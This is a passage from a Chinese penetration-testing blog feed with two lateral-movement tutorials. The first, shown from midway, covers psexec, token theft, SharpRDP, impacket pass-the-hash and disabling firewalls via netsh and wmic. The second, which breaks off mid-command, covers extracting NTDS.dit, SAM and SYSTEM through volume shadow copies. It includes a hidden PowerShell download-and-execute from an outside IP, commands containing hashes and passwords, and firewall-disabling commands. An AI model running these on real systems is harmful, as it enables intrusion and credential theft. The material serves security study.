。beacon会不断返回探测结果</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024828.png" alt="image-20220821002431586" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024245.png" alt="image-20220821002459084" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210028081.png" alt="image-20220821002824888" style="zoom:50%;" /></p><p>点击这个靶状的图标显示具体信息</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210029381.png" alt="image-20220821002907220" style="zoom:50%;" /><h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>使用psexec就可以使用我们之前获取下来的账户密码 尝试登录这些机器了！！我们尝试移动到DC。在内网需要建立SMB监听（内网一台主机监听DC，我们的消息从smb传到WEB再传到我们VPS</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210045294.png" alt="image-20220821004545125" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210039528.png" alt="image-20220821003902374" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210041658.png" alt="image-20220821004108900" style="zoom:50%;" /></p><p>其中session选项就是，通过我们在内网拿下的主机，凭借此建立的session进行跳转~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210042915.png" alt="image-20220821004223743"></p><p>成功拿到DC,以WEB机器为跳板机，跳至DC</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210043074.png" alt="image-20220821004340903" style="zoom:50%;" /><p>注意到SMB使用的payload是正向的管道连接~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210049564.png" alt="image-20220821004910411" style="zoom:50%;" /><h3 id="Psexec-psh"><a href="#Psexec-psh" class="headerlink" title="Psexec_psh"></a>Psexec_psh</h3><blockquote><p>Psexec_psh hash传递</p></blockquote><h3 id="WinRM-1"><a href="#WinRM-1" class="headerlink" title="WinRM"></a>WinRM</h3><h3 id="Token窃取-1"><a href="#Token窃取-1" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>steal token：只要用户登陆过就有对应token残留，我们就可以窃取~（只要没有关机）</p><p>另外：Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效（上面有讲）</p><p>可以对比下面的登录状态和注销状态的情况。并要注意到，msf自动集成了token窃取的工具，但是cs没有，需要我们手动上传。可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p><blockquote><p>de1ay\administrator登录状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081430453.png" alt="image-20220808143054224" style="zoom:50%;" /><blockquote><p>de1ay\administrator注销状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081431488.png" alt="image-20220808143124291" style="zoom:50%;" /><h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><blockquote><p>一个.NET控制台应用程序工具，可用于对横向目标执行针对远程目标<strong>的经过身份验证</strong>的命令执行。<br>用于经过身份验证的命令执行的远程桌面协议控制台应用程序</p></blockquote><h3 id="原理详解"><a href="#原理详解" class="headerlink" title="原理详解"></a>原理详解</h3><blockquote><p>再谈远程桌面横向移动<br>项目地址：<a href="https://github.com/0xthirteen/SharpRDP">0xthirteen&#x2F;SharpRDP</a></p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Regular RDP connection and execution</span><br><span class="line">常规RDP连接和执行</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password</span><br><span class="line"></span><br><span class="line">Exec program as child process of cmd or powershell</span><br><span class="line">执行程序作为cmd或powershell的子进程</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password exec=cmd</span><br><span class="line">Use restricted admin mode</span><br><span class="line">使用受限管理模式</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot;</span><br><span class="line">Connect first host drives</span><br><span class="line">连接第一个主机驱动器</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;\\tsclient\C\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password connectdrive=true</span><br><span class="line">Execute command elevated through Run Dialog - CURRENTLY BUGGED</span><br><span class="line">执行通过运行对话框提升的命令-当前已安装</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password elevated=winr</span><br><span class="line">Execute command elevated through task manager</span><br><span class="line">执行通过任务管理器提升的命令</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password elevated=taskmgr</span><br><span class="line">Add Network Level Authentication</span><br><span class="line">添加网络级身份验证</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password nla=true</span><br><span class="line">  </span><br><span class="line">Ask to take over logon session</span><br><span class="line">要求接管登录会话</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password takeover=true</span><br></pre></td></tr></table></figure><p>注：command为在目标机器上执行的命令<br>如果在目标上启用了受限管理模式，则不要指定任何凭据，它将使用当前用户上下文。<br>可以在 beacon 上 PTH 和 make_token ， windows 系统上 runas &#x2F;netonly</p><h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpRDP.exe computername=172.26.2.43 command=&quot;powershell.exe -nop -w hidden -c </span><br><span class="line">\&quot;IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://139.155.49.43:880/a&#x27;))\&quot;&quot; </span><br><span class="line">username=MINGY\WIN7-1 password=iam8@Mingyue123</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050073.png" alt="image-20220808204827813"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050987.png" alt="image-20220808204839761"></p><h2 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h2><p>impacket套件是通过445端口进行通信的，不是135端口。</p><ul><li>Windows</li></ul><blockquote><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户</span><br><span class="line">wmiexec.exe -hashes :518B98AD4178A53695DC997AA02D455C 域</span><br><span class="line">名/administrator@192.168.3.123 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>Linux</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c </span><br><span class="line">administrator@10.10.10.201 &quot;ipconfig&quot;</span><br><span class="line">域用户：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域</span><br><span class="line">名/administrator@10.10.10.201 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul><li>内网防火墙问题~内网可能主机开启了防火墙~~~该怎么办呢？（某些情况下，防火墙会阻止内网主机出网，会影响我们横向移动的时候，对内网其他主机发起请求作正向连接</li></ul><p>使用netsh对防火墙状态进行更改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看防火墙配置的策略</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">#所有网络</span><br><span class="line">打开所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line">关闭所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">#为当前网络配置防火墙</span><br><span class="line">(与域/专用/公用网络无关)</span><br><span class="line">打开当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state on</span><br><span class="line">关闭当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">#域网络</span><br><span class="line">打开域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state on</span><br><span class="line">关闭域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state off</span><br><span class="line"></span><br><span class="line">#专用网络</span><br><span class="line">打开专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state on</span><br><span class="line">关闭专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state off</span><br><span class="line"></span><br><span class="line">#公用网络</span><br><span class="line">打开公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state on</span><br><span class="line">关闭公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state off</span><br><span class="line"></span><br><span class="line">#较旧的Windows.版本</span><br><span class="line">XP Server 2003</span><br><span class="line">启用防火墙</span><br><span class="line">netsh firewall set opmode mode=ENABLE</span><br><span class="line">禁用防火墙</span><br><span class="line">netsh firewall set opmode mode=DISABLE</span><br></pre></td></tr></table></figure><ul><li>也是防火墙问题：msf正向连接报错，无法上线session会话时，我们如何关闭对面的防火墙呢</li></ul><p>前提时我们已经获取了该主机的账户密码，可以通过wmic连接上，并执行命令</p><p>关闭完对面的防火墙，就可以msf上线~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wmic关闭防火墙</span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process dall create &quot;cmd /c netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set domainprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set privateprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set publicprofile state off&quot;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p>基于IPC的横向移动 <a href="https://cloud.tencent.com/developer/article/1691880">https://cloud.tencent.com/developer/article/1691880</a><br><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">域渗透学习（五）基于IPC的远程连接</a><br>Impacket套件之远程命令执行功能讲解 <a href="https://www.sohu.com/a/346196275_257305">https://www.sohu.com/a/346196275_257305</a><br>内网横向移动学习备忘录 - 清风明月&#96;s Blog <a href="https://www.secpulse.com/archives/140140.html">https://www.secpulse.com/archives/140140.html</a><br>SharpRDP - 远程桌面协议控制台应用程序，用于经过身份验证的命令执行 <a href="https://www.mianshigee.com/project/0xthirteen-SharpRDP">https://www.mianshigee.com/project/0xthirteen-SharpRDP</a><br>WMI横向移动<a href="https://blog.csdn.net/lhh134/article/details/104150949">https://blog.csdn.net/lhh134/article/details/104150949</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x29 - 域内横向移动</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在上节所学的内网横向移动的某些内置命令、方法和工具，在域内也是可以用的。通过获取内网主机的凭证去登录其他主机，这种思路是通用的。并且要注意到工作组和域内渗透的不同之处（最大的不同方式应该在于域内的认证方式不同了~）</p><p>域内横向移动主要围绕域认证开始讲解。</p><h1 id="Windows认证机制（见密码凭据获取）"><a href="#Windows认证机制（见密码凭据获取）" class="headerlink" title="Windows认证机制（见密码凭据获取）"></a>Windows认证机制（见密码凭据获取）</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备</li></ul><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>要获取域内所有的凭证，先获取域管权限是最好的</p><h2 id="Ntds-dit活动目录数据库的介绍"><a href="#Ntds-dit活动目录数据库的介绍" class="headerlink" title="Ntds.dit活动目录数据库的介绍"></a>Ntds.dit<strong>活动目录数据库</strong>的介绍</h2><blockquote><p>(也被称为Active Directory database——-AD DS)</p></blockquote><ol><li>域内：</li></ol><p>Ntds.dit 是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中<strong>所有用户</strong>的密码哈希值。为了进一步保护密码哈希值，使用存储在 <strong>SYSTEM 注册表配置单元中的密钥</strong>对这些哈希值进行加密。第二个加密步骤是为了执行<strong>密码转储</strong>以进行审计，所以总共需要两个文件的副本：ntds.dit和system文件。</p><blockquote><ul><li><strong>AD DS由 NTDS.DIT 文件构成，是Active Directory的核心</strong></li><li><strong>默认存储在域控的 %SystemRoot%\NTDS\  文件夹下</strong></li><li><strong>只能通过域控制器进程和协议访问</strong></li></ul></blockquote><ol start="2"><li>工作组中</li></ol><p>另外，在非域环境也就是在工作组环境中，有一个sam文件存储着当前主机用户的密码信息，想要破解sam文件与ntds.dit文件都需要拥有一个system文件（上一节有讲到）。最可靠的执行密码审计的方法是脱机的。</p><ol start="3"><li>获取NTDS.DIT和SAM的内容</li></ol><p>因此我们可以通过获取到这两个文件，然后破解得到其中所存储的密码哈希值。Windows系统为了进一步保护存储的密码哈希值，使用存储在<strong>SYSTEM注册表配置单元中的密钥</strong>对这些哈希值进行加密。因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit</span><br><span class="line">SYSTEM文件位置：%SystemRoot%\System32\config\SYSTEM</span><br><span class="line">SAM文件位置：%SystemRoot%\System32\config\SAM</span><br></pre></td></tr></table></figure><p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用（实际上是被KDC占用），所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取其副本。获取副本后再用system文件密钥对之解密~~</p><p>接下来就是讲解工具对之利用~</p><h2 id="从Windows中获取NTDS-DIT等敏感文件"><a href="#从Windows中获取NTDS-DIT等敏感文件" class="headerlink" title="从Windows中获取NTDS.DIT等敏感文件"></a>从Windows中获取NTDS.DIT等敏感文件</h2><blockquote><p>下面讲述的方法围绕VSS（Volume Shadow Copy）展开，各种工具都是利用VSS，从中获取敏感文件的副本！！</p></blockquote><h3 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h3><p>Volume Shadow Copy Service  卷影复制服务（VSS）是微软从 Windows XP  开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。</p><p><strong>我们可以利用 Volume Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本</strong>。后面讲的一些方法也基本上都是围绕这VSS展开利用</p><blockquote><ul><li>系统内置~~支持 Windows Server 2003  及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul></blockquote><h4 id="注意备份后留下的痕迹："><a href="#注意备份后留下的痕迹：" class="headerlink" title="注意备份后留下的痕迹："></a>注意备份后留下的痕迹：</h4><ol><li>调用 Volume Shadow Copy 服务会产生SYSTEM日志， Event ID 为7036。</li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li></ol><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><blockquote><ul><li>获得信息全面：可获得所有用户hash</li><li>简单高效</li><li>无需下载ntds.dit，隐蔽性高</li><li>无需免杀</li></ul></blockquote><h3 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">ntdsutil官方介绍</a></p><p>官方文档直接Google翻译有点拗口，能懂英文还是直接看英文吧。机翻下来实在头大，还得是自己看原文来的快~~</p></blockquote><p>Ntdsutil.exe是一个命令行工具，它为Active Directory域服务(ADDS)和Active Directory轻型日录服务(AD LDS)提供<strong>管理工具</strong>。ntdsutil命令工具的功能：</p><blockquote><ul><li>ADDS的数据库维护</li><li>管理和控制单个主机操作</li><li>删除域控制器留下的元数据，这些域控制器将会在未卸载的情况下从网络中删除</li></ul></blockquote><p>注意：</p><blockquote><ul><li>域环境默认安装，要使用Ntdsutil.exe,您必须从<strong>管理员命令提示符运行</strong></li><li>如果安装了AD LDS服务器角色但未安装ADDS服务器角色，该怎么办？</li></ul><blockquote><p>则可以使用dsdbutil.exe和dsmgmt,exe命令行工具来执行上述的操作，将会有和ntdsutil.exe一样的效果</p></blockquote></blockquote><p>一般域环境默认安装Ntdsutil.exe</p><blockquote><p>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="交互式使用"><a href="#交互式使用" class="headerlink" title="交互式使用"></a>交互式使用</h4><ol><li>快照snapshot</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil#进入交互式执行</span><br><span class="line">help#查看哪些可以执行的命令</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds#激活ntds———设置“NTDS”或特定的AD LDS实例作为活动实例。</span><br><span class="line">create#创建快照，快照内容实际上就是对C盘的备份</span><br><span class="line">mount [GUID]#挂在快照到本地进行使用   GUID是快照ID</span><br><span class="line">接下来就可以使用copy命令下载我们需要的文件！</span><br><span class="line">#copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure><p>挂载完后我们就可以在里面COPY我们需要的SAM、NTDS.DIT、SYSTEM文件啦~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451005.png" alt="image-20220804071927342" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451065.png" alt="image-20220804071938619" style="zoom:50%;" /><ol start="2"><li>IFM</li></ol><p>上面的挂载尚显麻烦，我们可以使用更加快的方法IFM~~~~并且主要文件基本上都挂载出来了</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451121.png" alt="image-20220804071949087" style="zoom: 50%;" /><blockquote><ol><li>以管理员身份打开命令提示符（cmd.exe）</li><li>在命令提示符输入 ntdsutil 命令</li><li>在 ntdsutil 提示符下输入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">#&lt;Drive&gt;:\&lt;Folder&gt; 是要创建文件的文件夹路径。</span><br><span class="line"></span><br><span class="line">可以通过tree /f &lt;Drive&gt;:\&lt;Folder&gt;查看其具体文件  </span><br></pre></td></tr></table></figure></blockquote><h4 id="非交互使用"><a href="#非交互使用" class="headerlink" title="非交互使用"></a>非交互使用</h4><p>实战之中，我们很多时候都拿不到交互式的shell，我们需要使用非交互式的方法去执行相应的命令！~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="1-查询当前系统的快照"><a href="#1-查询当前系统的快照" class="headerlink" title="1.查询当前系统的快照"></a>1.查询当前系统的快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="2-创建快照"><a href="#2-创建快照" class="headerlink" title="2.创建快照"></a>2.创建快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guid为 &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;</span><br></pre></td></tr></table></figure><h5 id="3-挂载快照"><a href="#3-挂载快照" class="headerlink" title="3.挂载快照"></a>3.挂载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>快照挂载为 C:$SNAP_201908291617_VOLUMEC$\</p><h5 id="4-复制ntds-dit"><a href="#4-复制ntds-dit" class="headerlink" title="4.复制ntds.dit"></a>4.复制ntds.dit</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds2.dit</span><br></pre></td></tr></table></figure><h5 id="5-卸载快照"><a href="#5-卸载快照" class="headerlink" title="5.卸载快照"></a>5.卸载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="6-删除快照"><a href="#6-删除快照" class="headerlink" title="6. 删除快照"></a>6. 删除快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754968(v=ws.11)">官方文档</a></p></blockquote><p>vssadmin:卷影复制服务管理命令行工具。域环境默认安装</p><blockquote><p>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="查询当前系统的快照"><a href="#查询当前系统的快照" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><h4 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line">#/for=c:表示我们对C盘进行卷影备份</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得 Shadow Copy Volume Name 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451964.png" alt="image-20220804072326126" style="zoom:50%;" /><h4 id="查看备份的快照里面的文件"><a href="#查看备份的快照里面的文件" class="headerlink" title="查看备份的快照里面的文件"></a>查看备份的快照里面的文件</h4><p>但是这种奇怪的目录名：<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code>.我们是无法访问的，dir 命令也无法查看。~~~那么这种情况该怎么查看备份的卷影文件里面的文件呢？？通过创建链接的方式~</p><blockquote><ol><li>查看快照列表：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><ol start="2"><li>无法直接访问 ?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12  中的文件,可通过创建符号链接访问快照中的文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></pre></td></tr></table></figure><ol start="3"><li>删除符号链接：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rd c:\testvsc</span><br></pre></td></tr></table></figure></blockquote><h4 id="复制ntds-dit"><a href="#复制ntds-dit" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds3.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照"><a href="#删除快照" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br><span class="line"></span><br><span class="line">#/quiet为了是避免交互式Y/N选项~~</span><br></pre></td></tr></table></figure><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/vss/vshadow-tool-and-sample">官方文档</a></p></blockquote><p>Vshadow ( vshadow.exe ) 是用于管理卷影副本的命令行实用程序。此工具包含在 Microsoft Windows Software Development Kit (SDK)  中，有 Microsoft 签名。虽然不是内置的工具，但是也是官方的工具~~一定程度上不会引起注意。需要自己上传</p><p>Vshadow 有很多功能，包括执行脚本和调用命令以支持卷影快照管理的能力。</p><h4 id="查询当前系统的快照-1"><a href="#查询当前系统的快照-1" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure><h4 id="创建快照-1"><a href="#创建快照-1" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br><span class="line">参数说明：</span><br><span class="line">-p persistent，备份操作或是重启系统不会删除</span><br><span class="line">-nw no writers，用来提高创建速度</span><br><span class="line">C: 对应c盘</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451737.png" alt="image-20220804072600524" style="zoom: 50%;" /><p>获得SnapshotSetID、SnapshotID、Shadow copy device name</p><h4 id="复制ntds-dit-1"><a href="#复制ntds-dit-1" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy [Shadow copy device name]\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照-1"><a href="#删除快照-1" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow -dx=ShadowCopySetId</span><br><span class="line">vshadow -ds=ShadowCopyId</span><br></pre></td></tr></table></figure><h4 id="利用vshadow执行命令"><a href="#利用vshadow执行命令" class="headerlink" title="利用vshadow执行命令"></a>利用vshadow执行命令</h4><blockquote><p>参考：<a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p></blockquote><p>Vshadow.exe  支持 -exec 参数，可用于执行二进制文件（.exe）或脚本（.bat&#x2F;.cmd）。<br>-exec 参数不支持命令参数</p><blockquote><p>要求：</p><ul><li>管理员权限</li><li>上传 Vshadow.exe</li><li>上传攻击载荷</li></ul></blockquote><p>执行命令格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -nw -exec=&lt;\path\to\exe&gt; 